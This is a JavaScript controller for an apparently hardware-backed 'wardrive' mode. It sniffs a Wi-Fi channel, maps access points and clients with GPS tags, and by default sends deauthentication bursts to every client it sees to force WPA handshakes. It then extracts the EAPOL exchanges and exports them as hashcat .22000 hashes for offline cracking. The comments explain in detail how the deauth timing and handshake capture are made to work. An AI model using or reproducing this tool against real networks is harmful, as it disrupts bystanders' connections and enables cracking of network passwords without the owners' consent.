// wardrive.js — Wardrive mode controller.
//
// States: IDLE, STARTING, CAPTURING, STOPPING
//
// THE DATA PATH. Every bug this file has had came from misunderstanding it:
//
//   wardrive_start {channel}    -> the S3 locks that one channel and sniffs
//   FT_PCAP_CONT (0x07) frames  -> ONE radiotap+802.11 frame per frame, sent
//                                  live, handed here by app.js's decoder
//   get_segment (polled 250ms)  -> drains the device's ring buffer. It carries
//                                  no frames and never did — the reply is a
//                                  count. Without the poll the ring overwrites
//                                  itself and frames are lost silently.
//
// So frames do not arrive *in reply* to anything. They are pushed. This file is
// therefore an ingest, not a fetch loop, and the poll's only job is to keep the
// device's ring moving.
//
// Parsing is delegated: analyze.js's parseChunk for the 802.11 layer (including
// the radiotap strip and the QoS-aware payload offset) and crack.js's
// parseEapolKey / roles / extractHandshakes for EAPOL. There is deliberately no
// second implementation of either here — a hand-rolled one was what broke this
// mode: it read frame control from offset 0 of a radiotap-prefixed frame, so no
// beacon and no data frame could ever match, and its deauth never fired.
//
// Requires: request, log, icon, gps, hashStore injected via init().
// Mounted to window.Wardrive.

import { parseChunk } from './analyze.js';
import { roles, parseEapolKey, extractHandshakes } from './crack.js';
import { bytesToBase64 } from './transport.js';

(function () {
  'use strict';

  const STATE = { IDLE: 'IDLE', STARTING: 'STARTING', CAPTURING: 'CAPTURING', STOPPING: 'STOPPING' };

  // How many frames to retain for the sweep at stop(). An M1..M4 exchange ends
  // within a few frames of the deauth, so this is far deeper than reachable —
  // it bounds memory on a phone that walks for hours.
  const KEEP_CHUNKS = 20000;
  // Per-pair history, for extracting a hash the moment its M2 lands.
  const KEEP_PAIR_CHUNKS = 64;
  // One target at a time. The ring refills faster than this on a busy channel.
  const DEAUTH_INTERVAL_MS = 500;

  // A deauth burst takes the board OUT of "capturing" on purpose: it mutes
  // promiscuous so it cannot hear its own TX, and GET_SEGMENT refuses with
  // "wardrive not capturing" until the burst ends. Five frames at 100 ms is a
  // ~500 ms window — twice the 250 ms poll — so the very next poll lands inside
  // it. Reading that refusal as fatal is what ended every session ~2 s in, right
  // after the first deauth. The board resumes on its own (wardrive_poll() flips
  // back to CAPTURING once tx_running() clears); the app just has to wait.
  const BURST_MARGIN_MS = 400;   // slack past the computed burst end
  const POLL_FAIL_LIMIT = 3;     // consecutive refusals OUTSIDE a burst = real

  // In-memory maps for seen APs and associated clients
  let seenAPs = new Map();       // bssid -> {ssid, channel, frames, clients: Set<mac>}
  let deauthQueue = [];          // [{bssid, client}]
  let lastDeauthTime = 0;
  let burstUntilMs = 0;          // our burst mutes capture until this timestamp
  let pollFailStreak = 0;        // consecutive "not capturing" refusals outside a burst
  let handshakeCount = 0;
  let eapolFrames = 0;
  let frameCount = 0;
  let unparsedCount = 0;
  let deauthCount = 0;
  let deauthErrors = 0;
  let lastDeauthError = null;
  let chunks = [];               // bounded ring, swept at stop()
  let pairChunks = new Map();    // "bssid|client" -> bounded chunk list
  let beaconChunks = new Map();  // bssid -> the beacon that named it (the salt)
  let storedHashes = new Set();  // "bssid|client|type" already written
  let channel = 6;
  let state = STATE.IDLE;

  // Injected dependencies
  let _request = null;
  let _log = null;
  let _icon = null;
  let _gps = null;
  let _hashStore = null;

  // UI element references (set during init)
  let $wardriveBtn = null;
  let $wardriveStatus = null;
  let $wardriveChannel = null;
  let $wardriveDeauth = null;     // the card's "Send deauths" box; off = listen only
  let $gpsStatus = null;
  let $wFrames = null;
  let $wAPs = null;
  let $wDeauths = null;
  let $wHandshakes = null;
  let $wDuration = null;
  let $wardriveLog = null;

  let pollTimer = null;
  let startTime = null;
  let sessionDurationTimer = null;

  // ── init ─────────────────────────────────────────────────────────────────────

  /**
   * Set up UI references and bind button handlers.
   * deps: { request, log, icon, gps, hashStore }
   */
  function init(deps) {
    _request = deps.request;
    _log = deps.log;
    _icon = deps.icon || (() => '');
    _gps = deps.gps || window.GPS;
    _hashStore = deps.hashStore || window.HashStore;

    $wardriveBtn = document.getElementById('wardriveBtn');
    $wardriveStatus = document.getElementById('wardriveStatus');
    $wardriveChannel = document.getElementById('wardriveChannel');
    $wardriveDeauth = document.getElementById('wardriveDeauth');
    $gpsStatus = document.getElementById('gpsStatus');
    $wFrames = document.getElementById('wFrames');
    $wAPs = document.getElementById('wAPs');
    $wDeauths = document.getElementById('wDeauths');
    $wHandshakes = document.getElementById('wHandshakes');
    $wDuration = document.getElementById('wDuration');
    $wardriveLog = document.getElementById('wardriveLog');

    if ($wardriveBtn) {
      $wardriveBtn.addEventListener('click', () => {
        if (state === STATE.IDLE) {
          start();
        } else if (state === STATE.CAPTURING) {
          stop();
        }
      });
    }
  }

  // ── state helpers ────────────────────────────────────────────────────────────

  function isRunning() {
    return state === STATE.CAPTURING || state === STATE.STARTING;
  }

  function getState() {
    return state;
  }

  /** The channel to lock, from the card's field. Falls back to 6. */
  function readChannel() {
    const v = $wardriveChannel ? parseInt($wardriveChannel.value, 10) : NaN;
    return Number.isFinite(v) && v >= 1 && v <= 196 ? v : 6;
  }

  /**
   * May wardrive transmit deauthentication frames?
   *
   * The one control that decides whether this mode listens or interferes.
   * Read LIVE from the card rather than latched at start(), so clearing the box
   * mid-walk stops the transmitting immediately instead of at the next session.
   * Defaults to ON when the element is absent, so a build without the checkbox
   * keeps the behaviour it had before the switch existed.
   */
  function deauthEnabled() {
    return $wardriveDeauth ? $wardriveDeauth.checked : true;
  }

  /** GPS fixes arrive with the position object as their only argument. */
  function onGpsUpdate() {
    updateUI();
  }

  // ── start / stop ─────────────────────────────────────────────────────────────

  async function start() {
    if (state !== STATE.IDLE) return;
    state = STATE.STARTING;
    updateUI();

    channel = readChannel();
    resetStats();
    logWardrive('Starting wardrive on channel ' + channel + '…');
    logWardrive(deauthEnabled()
      ? 'Deauths ON — clients will be kicked to force a handshake.'
      : 'Deauths OFF — listening only. Nothing is transmitted.');

    try {
      // 1. GPS first: every stored handshake is tagged with where it was found.
      if (_gps && typeof _gps.startTracking === 'function') _gps.startTracking(onGpsUpdate);

      // 2. Lock the channel and start sniffing. This is the command that puts
      //    the device into its capturing state — get_segment is refused without
      //    it, which is why it has to be this one and not a generic capture call.
      if (!_request) throw new Error('no link to the board');
      const resp = await _request('wardrive_start', { channel }, { timeoutMs: 5000 });
      if (!resp) {
        // A reply that never parsed is NOT a refusal. The old wording here
        // ("board refused") sent us hunting the firmware for a day while the
        // app's own decoder was splicing the reply at a USB packet boundary —
        // see tools/verify_transport.mjs.
        throw new Error('no parsable reply to wardrive_start (protocol error, not a refusal)');
      }
      if (resp.ok !== true) {
        const msg = resp.error || 'board refused wardrive_start';
        // "already running" is the state we asked for, not a failure. A start
        // whose reply was lost (or a previous session) leaves the board
        // capturing with the app sitting at IDLE — and the app cannot stop what
        // it does not know about, so it refuses to do anything ever again.
        // Adopt the running session and drain it instead.
        if (!/already running/i.test(msg)) throw new Error(msg);
        logWardrive('Board was already capturing — adopting the running session');
      } else {
        logWardrive('Capturing on channel ' + channel);
      }

      // 3. Begin the drain loop. Frames arrive on their own from here.
      state = STATE.CAPTURING;
      startTime = Date.now();
      startSessionTimer();
      pollLoop();
      updateUI();
      if (_log) _log('ev', 'wardrive started on channel ' + channel);
    } catch (e) {
      logWardrive('Error: ' + e.message);
      if (_log) _log('err', 'wardrive start: ' + e.message);
      if (_gps && typeof _gps.stopTracking === 'function') _gps.stopTracking();
      state = STATE.IDLE;
      updateUI();
    }
  }

  async function stop() {
    if (state !== STATE.CAPTURING) return;
    state = STATE.STOPPING;
    updateUI();
    logWardrive('Stopping wardrive…');

    // 1. Stop the poll loop
    if (pollTimer) {
      clearTimeout(pollTimer);
      pollTimer = null;
    }
    if (sessionDurationTimer) {
      clearInterval(sessionDurationTimer);
      sessionDurationTimer = null;
    }

    // 2. Take the radio out of capturing state
    try {
      if (_request) {
        const resp = await _request('wardrive_stop', undefined, { timeoutMs: 3000 });
        if (resp && resp.ok) logWardrive('Capture stopped on the board');
        else if (resp) logWardrive('stop: ' + (resp.error || 'board refused'));
      }
    } catch (e) {
      if (_log) _log('err', 'wardrive stop: ' + e.message);
    }

    // 3. Stop GPS
    if (_gps && typeof _gps.stopTracking === 'function') _gps.stopTracking();

    // 3b. Drain whatever is still queued: the tail sweep can only see frames that
    //     have been parsed, and a ring flush can leave thousands still waiting.
    if (ingestTimer) { clearTimeout(ingestTimer); ingestTimer = null; }
    const stillQueued = ingestQueue.splice(0, ingestQueue.length);
    for (const c of stillQueued) ingestFrame(c);
    if (stillQueued.length) logWardrive('Drained ' + stillQueued.length + ' queued frame(s) before the tail sweep');
    if (ingestDropped) logWardrive('Ingest dropped ' + ingestDropped + ' frame(s) this session');

    // 4. Final sweep: a handshake whose M1 and M2 straddled the tail of the
    //    session is only visible over the whole ring.
    const added = extractOver(chunks);
    if (added) logWardrive('Tail sweep: ' + added + ' more handshake(s)');

    const sessionId = _hashStore ? _hashStore.getCurrentSession() : null;
    logWardrive('Session ' + (sessionId || '(none)') + ': ' + frameCount + ' frames, ' +
      seenAPs.size + ' APs, ' + handshakeCount + ' handshakes');
    showExportDialog(sessionId);

    state = STATE.IDLE;
    updateUI();
    if (_log) {
      _log('ev', 'wardrive stopped — ' + frameCount + ' frames, ' + handshakeCount +
        ' handshakes, ' + deauthCount + ' deauths' +
        (deauthErrors ? ', ' + deauthErrors + ' deauth errors' : ''));
    }
  }

  // ── poll loop ────────────────────────────────────────────────────────────────

  /**
   * Drain the device's ring, then service the deauth queue.
   *
   * The frames are NOT in this reply. get_segment returns a count; the frames
   * come in separately as FT_PCAP_CONT and are handled by onSegmentChunk.
   */
  async function pollLoop() {
    if (state !== STATE.CAPTURING) return;

    try {
      // Skip the drain while a burst we started is in flight: the board is
      // deliberately not capturing, so a refusal here says nothing about health.
      const inBurst = Date.now() < burstUntilMs;
      if (_request && !inBurst) {
        const resp = await _request('GET_SEGMENT', undefined, { timeoutMs: 2000 });
        if (resp && resp.ok === false && /wardrive|not capturing/i.test(resp.error || '')) {
          // Not capturing OUTSIDE a burst is real — but a single refusal is not
          // proof of a dead board, so require a few in a row before ending the run.
          pollFailStreak++;
          if (pollFailStreak >= POLL_FAIL_LIMIT) {
            logWardrive('Board is not capturing (' + resp.error + ') — stopping after ' +
              pollFailStreak + ' polls.');
            if (_log) _log('err', 'wardrive: ' + resp.error);
            stop();
            return;
          }
          logWardrive('Board not capturing (' + resp.error + ') — retry ' +
            pollFailStreak + '/' + POLL_FAIL_LIMIT + '.');
        } else {
          pollFailStreak = 0;
        }
      }

      await autoDeauth();
    } catch (e) {
      // A timeout while the radio is mid-burst is normal. Anything else is worth
      // one line, because swallowed errors are how this mode stayed broken.
      if (!/timed out/.test(e.message || '')) logWardrive('poll: ' + e.message);
    }

    updateUI();

    if (state === STATE.CAPTURING) {
      pollTimer = setTimeout(pollLoop, 250);
    }
  }

  // ── ingest ───────────────────────────────────────────────────────────────────

  // Bounded ingest. app.js's decoder calls onSegmentChunk FROM THE USB DATA
  // HANDLER, and a device flushing a stale ring hands us tens of thousands of
  // frames back-to-back. Parsing each one inline — and repainting per frame —
  // saturates the renderer: the UI stops repainting, CDP stops answering, and
  // adbd dies with it. So this handler only queues; ingestTick() parses a bounded
  // slice and yields, which keeps the WebView alive through any backlog.
  const INGEST_QUEUE_MAX = 4000;   // frames held before the OLDEST are dropped
  const INGEST_PER_TICK = 250;     // frames parsed per slice
  let ingestQueue = [];
  let ingestTimer = null;
  let ingestDropped = 0;
  let ingestDropLoggedAt = 0;

  /**
   * One radiotap+802.11 frame, straight off an FT_PCAP_CONT message.
   *
   * Public: app.js's decoder calls this. Exactly one frame per call — the device
   * frames them itself, so there is nothing to split.
   *
   * It MUST NOT parse: this runs on the USB data path, so it only queues.
   */
  function onSegmentChunk(chunk) {
    if (state !== STATE.CAPTURING && state !== STATE.STOPPING) return;
    ingestQueue.push(chunk);
    if (ingestQueue.length > INGEST_QUEUE_MAX) {
      // The backlog is stale by definition — keep the newest frames and count
      // what was thrown away. Silent dropping is how this mode got its reputation.
      ingestDropped += ingestQueue.length - INGEST_QUEUE_MAX;
      ingestQueue.splice(0, ingestQueue.length - INGEST_QUEUE_MAX);
    }
    if (!ingestTimer) ingestTimer = setTimeout(ingestTick, 0);
  }

  /** Parse one bounded slice, repaint once, then yield back to the event loop. */
  function ingestTick() {
    ingestTimer = null;
    const batch = ingestQueue.splice(0, INGEST_PER_TICK);
    for (const chunk of batch) ingestFrame(chunk);
    updateUI();
    if (ingestDropped && Date.now() - ingestDropLoggedAt > 2000) {
      ingestDropLoggedAt = Date.now();
      logWardrive('INGEST dropped ' + ingestDropped + ' frame(s) — backlog exceeded ' +
        INGEST_QUEUE_MAX + ' (the ring flushed faster than frames parse)');
    }
    if (ingestQueue.length && (state === STATE.CAPTURING || state === STATE.STOPPING)) {
      ingestTimer = setTimeout(ingestTick, 0);
    }
  }

  /** Parse exactly ONE frame. Called by ingestTick() and stop()'s flush only. */
  function ingestFrame(chunk) {
    if (!chunk || chunk.length < 24) { unparsedCount++; return; }

    const f = parseChunk(chunk);
    if (!f) { unparsedCount++; return; }
    frameCount++;
    remember(chunk);

    // ── APs, from beacons and probe responses (BSSID is addr3) ────────────────
    if (f.type === 'mgmt' && (f.subtype === 'beacon' || f.subtype === 'probe-resp')) {
      const bssid = f.addr3;
      if (!bssid) return;
      const ap = noteAP(bssid, f.ssid, f.channel);
      ap.frames++;
      // Keep the beacon: it carries the SSID bytes, and the SSID is the salt in
      // the .22000 line. No beacon, no crackable hash — crack.js reports that as
      // an "incomplete" with reason no-essid.
      if (!beaconChunks.has(bssid)) beaconChunks.set(bssid, chunk);
      if (ap.ssid && !ap.logged) {
        ap.logged = true;
        logWardrive('AP ' + bssid + ' "' + ap.ssid + '" ch' + (ap.channel ?? '?'));
      }
      return;
    }

    if (f.type !== 'data') return;

    // ── Clients, and therefore deauth targets ─────────────────────────────────
    const { client, bssid } = roles(f);
    if (!bssid || !client) return;              // WDS/ambiguous: skip, per crack.js
    if (isMulticast(client) || isBroadcast(bssid)) return;

    const ap = noteAP(bssid, null, f.channel);
    ap.frames++;
    if (!ap.clients.has(client)) {
      ap.clients.add(client);
      // Only queue when we are allowed to act on it. Queuing regardless would
      // grow the list unbounded across a long walk, and every stale target
      // would then fire the moment the box was ticked.
      if (deauthEnabled()) {
        deauthQueue.push({ bssid, client });
        logWardrive('Target ' + client + ' on ' + bssid);
      }
    }

    // ── EAPOL: the whole point ────────────────────────────────────────────────
    // The offset has to come from parseChunk: a data frame's body does not start
    // at a fixed offset once QoS control is present.
    const eap = parseEapolKey(chunk, f.payloadOff);
    if (!eap) return;

    eapolFrames++;
    const key = bssid + '|' + client;
    if (!pairChunks.has(key)) pairChunks.set(key, []);
    const hist = pairChunks.get(key);
    hist.push(chunk);
    if (hist.length > KEEP_PAIR_CHUNKS) hist.shift();

    logWardrive('EAPOL M' + eap.message + ' ' + client + ' <-> ' + bssid);

    // Try immediately: an M2 arriving after its M1 completes a crackable pair,
    // and the ANonce is in the history either way.
    extractOver(pairHistory(bssid, key));
    // No repaint here: ingestTick() paints once per slice, and painting per frame
    // is half of what took the UI down with a ring flush.
  }

  function remember(chunk) {
    chunks.push(chunk);
    if (chunks.length > KEEP_CHUNKS) chunks.shift();
  }

  /** The beacon that named this BSSID, plus the exchanges seen on this pair. */
  function pairHistory(bssid, key) {
    const out = [];
    const b = beaconChunks.get(bssid);
    if (b) out.push(b);
    const hist = pairChunks.get(key);
    if (hist) out.push(...hist);
    return out;
  }

  // ── hash extraction ──────────────────────────────────────────────────────────

  /**
   * Extract hashes from a chunk list and write new ones to HashStore.
   *
   * Stores the real .22000 line that crack.js builds — never a placeholder. The
   * old code wrote a made-up string into the hash field, so the export produced
   * a .22000 file that hashcat could not read a single line of.
   *
   * Returns how many hashes were newly stored.
   */
  function extractOver(list) {
    if (!list || !list.length) return 0;

    let res;
    try {
      res = extractHandshakes(list);
    } catch (e) {
      if (_log) _log('err', 'wardrive extract: ' + e.message);
      return 0;
    }

    const gps = _gps && _gps.position;
    let added = 0;
    for (const h of res.handshakes) {
      const key = h.bssid + '|' + h.client + '|' + h.type;
      if (storedHashes.has(key)) continue;
      storedHashes.add(key);

      const ap = seenAPs.get(h.bssid);
      if (_hashStore) {
        _hashStore.addHash(
          h.line,
          h.bssid,
          h.essid || ap?.ssid || '(unknown)',
          ap?.channel ?? channel,
          gps?.lat ?? null,
          gps?.lon ?? null,
          gps?.accuracy ?? null
        );
      }
      handshakeCount++;
      added++;
      logWardrive('Handshake stored: ' + h.bssid + ' (' + h.type + ': ' +
        (h.messages || []).join('+') + ')');
    }

    // An exchange seen but unusable is worth saying out loud, because the usual
    // cause is a missing beacon — i.e. the deauth worked and the salt did not.
    for (const inc of res.incomplete || []) {
      const key = 'inc|' + inc.bssid + '|' + inc.client + '|' + inc.reason;
      if (storedHashes.has(key)) continue;
      storedHashes.add(key);
      logWardrive('Exchange unusable (' + inc.reason + '): ' + inc.bssid);
    }

    return added;
  }

  // ── auto deauth ──────────────────────────────────────────────────────────────

  async function autoDeauth() {
    // The gate. Checked here, not only at queue time, so ticking or clearing the
    // box takes effect on the very next cycle.
    if (!deauthEnabled()) return;
    if (deauthQueue.length === 0) return;

    const now = Date.now();
    if (now < burstUntilMs) return;                         // our own burst is in flight
    if (now - lastDeauthTime < DEAUTH_INTERVAL_MS) return;

    const target = deauthQueue.shift();
    if (!target || !_request) return;

    const hexBssid = target.bssid.replace(/:/g, '');
    const hexClient = target.client.replace(/:/g, '');

    try {
      const resp = await _request('deauth_now', {
        bssid: hexBssid,
        client: hexClient,
        count: 5,
        interval_ms: 100,
      }, { timeoutMs: 2000 });

      if (resp && resp.ok) {
        deauthCount++;
        lastDeauthTime = now;
        // Trust the board's numbers, not the ones we asked for: the window it is
        // out of capture is the burst it actually started.
        const n  = Number(resp.count) || 5;
        const iv = Number(resp.interval_ms) || 100;
        burstUntilMs = Date.now() + n * iv + BURST_MARGIN_MS;
        logWardrive('Deauth ' + target.client + ' <- ' + target.bssid);
      } else {
        // Counted and logged, not swallowed: a refused deauth is the difference
        // between a recorder and a deauther, and silence here hid that.
        deauthErrors++;
        lastDeauthError = resp?.error || 'refused';
        logWardrive('Deauth refused: ' + lastDeauthError);
      }
    } catch (e) {
      deauthErrors++;
      lastDeauthError = e.message;
      logWardrive('Deauth failed: ' + e.message);
    }
  }

  // ── UI updates ───────────────────────────────────────────────────────────────

  function updateUI() {
    if ($wardriveBtn) {
      if (state === STATE.IDLE) {
        $wardriveBtn.textContent = 'Start Wardrive';
        $wardriveBtn.className = '';
        $wardriveBtn.disabled = false;
      } else if (state === STATE.CAPTURING) {
        $wardriveBtn.textContent = 'Stop Wardrive';
        $wardriveBtn.className = 'danger';
        $wardriveBtn.disabled = false;
      } else {
        $wardriveBtn.textContent = state;
        $wardriveBtn.disabled = true;
      }
    }

    if ($wardriveStatus) {
      $wardriveStatus.classList.toggle('hidden', state === STATE.IDLE);
    }

    if ($gpsStatus) {
      const gps = _gps && _gps.position;
      if (gps && gps.lat != null) {
        $gpsStatus.textContent = gps.lat.toFixed(5) + ', ' + gps.lon.toFixed(5) +
          ' ±' + (gps.accuracy != null ? gps.accuracy.toFixed(0) + 'm' : '?');
        $gpsStatus.style.color = 'var(--ok)';
      } else {
        $gpsStatus.textContent = 'no fix';
        $gpsStatus.style.color = '';
      }
    }

    if ($wFrames) $wFrames.textContent = frameCount;
    if ($wAPs) $wAPs.textContent = seenAPs.size;
    if ($wDeauths) $wDeauths.textContent = deauthCount + (deauthErrors ? ' (' + deauthErrors + ' failed)' : '');
    if ($wHandshakes) $wHandshakes.textContent = handshakeCount;
  }

  function startSessionTimer() {
    if (sessionDurationTimer) clearInterval(sessionDurationTimer);
    sessionDurationTimer = setInterval(() => {
      if ($wDuration && startTime) {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        $wDuration.textContent = elapsed + 's';
      }
    }, 1000);
  }

  function logWardrive(msg) {
    if (!$wardriveLog) return;
    const t = new Date().toLocaleTimeString([], { hour12: false });
    const line = document.createElement('div');
    line.textContent = '[' + t + '] ' + msg;
    $wardriveLog.appendChild(line);
    $wardriveLog.scrollTop = $wardriveLog.scrollHeight;
  }

  function resetStats() {
    seenAPs = new Map();
    deauthQueue = [];
    chunks = [];
    pairChunks = new Map();
    beaconChunks = new Map();
    storedHashes = new Set();
    handshakeCount = 0;
    eapolFrames = 0;
    frameCount = 0;
    unparsedCount = 0;
    deauthCount = 0;
    deauthErrors = 0;
    lastDeauthError = null;
    lastDeauthTime = 0;
    burstUntilMs = 0;
    pollFailStreak = 0;
    ingestQueue = [];
    if (ingestTimer) { clearTimeout(ingestTimer); ingestTimer = null; }
    ingestDropped = 0;
    ingestDropLoggedAt = 0;
  }

  // ── export dialog ────────────────────────────────────────────────────────────

  function showExportDialog(sessionId) {
    if (!_hashStore || !sessionId) return;

    const records = _hashStore.getSession(sessionId) || [];
    const hasJSON = records.length > 0;
    const has22000 = _hashStore.export22000(sessionId).length > 0;

    logWardrive('Session ' + sessionId + ': ' + records.length + ' records. ' +
      (has22000 ? '22000 export available.' : 'No handshakes captured.'));

    // Simple export UI appended to wardrive log area
    if ($wardriveLog && hasJSON) {
      const exportNote = document.createElement('div');
      exportNote.style.cssText = 'margin-top:6px;padding:8px;background:var(--surface-2);border-radius:8px;font-size:11px;';
      exportNote.innerHTML =
        '<div style="font-weight:650;margin-bottom:4px;">Export session ' + sessionId + '</div>' +
        '<button id="exportJSONBtn" class="ghost" style="font-size:11px;padding:6px 10px;margin-right:6px;">Export JSON</button>' +
        (has22000 ? '<button id="export22000Btn" class="ghost" style="font-size:11px;padding:6px 10px;">Export .22000</button>' : '');
      $wardriveLog.appendChild(exportNote);
      $wardriveLog.scrollTop = $wardriveLog.scrollHeight;

      // Bind export buttons after they're in the DOM
      setTimeout(() => {
        const jsonBtn = document.getElementById('exportJSONBtn');
        if (jsonBtn) {
          jsonBtn.addEventListener('click', () => { exportSession(sessionId, 'json').catch(() => {}); });
        }
        const hcBtn = document.getElementById('export22000Btn');
        if (hcBtn) {
          hcBtn.addEventListener('click', () => { exportSession(sessionId, '22000').catch(() => {}); });
        }
      }, 50);
    }
  }

  // ── export to a file on the phone ─────────────────────────────────────────────
  //
  // These exports used to be a blob URL + `<a download>` click — a browser
  // mechanism. The Android app sets no DownloadListener, and a stock Capacitor
  // WebView ignores those clicks, so pressing Export did nothing at all: no file,
  // no error, no dialog. The data was in localStorage the whole time with no way
  // out. Write through the Filesystem plugin instead, exactly as capture.js does
  // for pcaps (see Rule 14 — a string without `encoding` must be base64).

  function filesystem() {
    const p = window.Capacitor?.Plugins?.Filesystem;
    if (!p) throw new Error('Filesystem plugin not available (not running in the app?)');
    return p;
  }

  // Ordered: the folder the user expects first, then a known-good fallback, then
  // app-private storage so an export never vanishes entirely. Android 11+ blocks
  // arbitrary writes to shared storage, so EXTERNAL_STORAGE may be refused here —
  // that is what the next attempt is for, and the log line names where it landed.
  const EXPORT_DIRS = [
    { directory: 'EXTERNAL_STORAGE', path: 'Xixchil/' },  // /sdcard/Xixchil/
    { directory: 'DOCUMENTS', path: 'Xixchil/' },         // /sdcard/Documents/Xixchil/
    { directory: 'DATA', path: '' },                      // app-private, always writable
  ];

  async function writeExportFile(text, filename) {
    const data = bytesToBase64(new TextEncoder().encode(text));
    let lastErr = null;
    for (const d of EXPORT_DIRS) {
      try {
        const res = await filesystem().writeFile({
          path: d.path + filename,
          data,
          directory: d.directory,
          recursive: true,
        });
        return res?.uri || (d.directory + '/' + d.path + filename);
      } catch (e) {
        lastErr = e;
      }
    }
    throw new Error('could not write ' + filename + ': ' + (lastErr?.message || 'unknown error'));
  }

  /**
   * A filename a human can read.
   *
   * The session id is `Date.now().toString(36)` (hashstore.js `addHash`) — a
   * base-36 epoch ms, which is why exports arrived named `wardrive-mwphghvd`:
   * that string is not the SSID and not random, it is 2026-11-20 15:20:22.
   * Turn it back into the date the session started instead of shipping the
   * gibberish. Anything that is not a plausible base-36 timestamp (a renamed or
   * imported session id) keeps its own name, date-prefixed, so a filename never
   * loses the part that identifies it.
   */
  function exportFilename(sessionId, isJSON) {
    const ext = isJSON ? '.json' : '.22000';
    const p = (n) => String(n).padStart(2, '0');
    // parseInt('z', 36) etc. is a valid number but nonsense as a date, hence the range.
    const ms = /^[0-9a-z]{4,}$/i.test(sessionId) ? parseInt(sessionId, 36) : NaN;
    if (Number.isFinite(ms) && ms > 1577836800000 && ms < 4102444800000) { // 2020..2100
      const d = new Date(ms);
      return 'wardrive-' + d.getFullYear() + '-' + p(d.getMonth() + 1) + '-' + p(d.getDate()) +
             '-' + p(d.getHours()) + p(d.getMinutes()) + p(d.getSeconds()) + ext;
    }
    return 'wardrive-' + sessionId.replace(/[^A-Za-z0-9._-]/g, '_').slice(0, 40) + ext;
  }

  // Export one session to a file. kind: 'json' (map rendering) | '22000' (hashcat).
  async function exportSession(sessionId, kind) {
    if (!_hashStore || !sessionId) throw new Error('no session to export');
    const isJSON = kind !== '22000';
    const text = isJSON ? _hashStore.exportJSON(sessionId) : _hashStore.export22000(sessionId);
    if (!text) throw new Error('nothing to export for session ' + sessionId);
    const filename = exportFilename(sessionId, isJSON);

    // Outside the app (desktop dev in a browser) there is no filesystem plugin;
    // fall back to the download the old code used.
    if (!window.Capacitor?.Plugins?.Filesystem) {
      downloadText(text, filename, isJSON ? 'application/json' : 'text/plain');
      return 'browser download';
    }

    try {
      const where = await writeExportFile(text, filename);
      logWardrive('Saved ' + filename + ' → ' + where);
      return where;
    } catch (e) {
      logWardrive('Export failed: ' + e.message);
      throw e;
    }
  }

  function downloadText(text, filename, mimeType) {
    const blob = new Blob([text], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // ── helpers ──────────────────────────────────────────────────────────────────

  function noteAP(bssid, ssid, ch) {
    if (!seenAPs.has(bssid)) {
      seenAPs.set(bssid, { ssid: null, channel: null, frames: 0, clients: new Set() });
    }
    const ap = seenAPs.get(bssid);
    if (ssid && ssid !== ap.ssid) ap.ssid = ssid;
    if (ch && ch !== ap.channel) ap.channel = ch;
    return ap;
  }

  function isBroadcast(mac) {
    return !mac || mac === 'ff:ff:ff:ff:ff:ff';
  }

  /** The group bit. A multicast "client" is not a station and cannot be deauthed. */
  function isMulticast(mac) {
    if (!mac) return true;
    const first = parseInt(mac.slice(0, 2), 16);
    return Number.isFinite(first) && (first & 1) === 1;
  }

  // ── test surface ─────────────────────────────────────────────────────────────

  /**
   * Counters and inventory, for tools/verify_wardrive.mjs.
   *
   * The counters are the assertions: a mode that reports 0 frames, 0 APs and 0
   * deauths while frames are plainly on the wire is the bug shape this exposes.
   */
  function getStats() {
    return {
      state,
      channel,
      frameCount,
      unparsedCount,
      eapolFrames,
      handshakeCount,
      deauthCount,
      deauthErrors,
      lastDeauthError,
      burstRemainingMs: Math.max(0, burstUntilMs - Date.now()),
      pollFailStreak,
      queued: deauthQueue.length,
      ingestQueued: ingestQueue.length,
      ingestDropped,
      aps: seenAPs.size,
      seen: [...seenAPs.entries()].map(([bssid, ap]) => ({
        bssid,
        ssid: ap.ssid,
        channel: ap.channel,
        frames: ap.frames,
        clients: [...ap.clients],
      })),
    };
  }

  // ── public API ───────────────────────────────────────────────────────────────

  window.Wardrive = {
    init,
    start,
    stop,
    isRunning,
    getState,
    onSegmentChunk,
    getStats,
    exportSession,
  };
})();
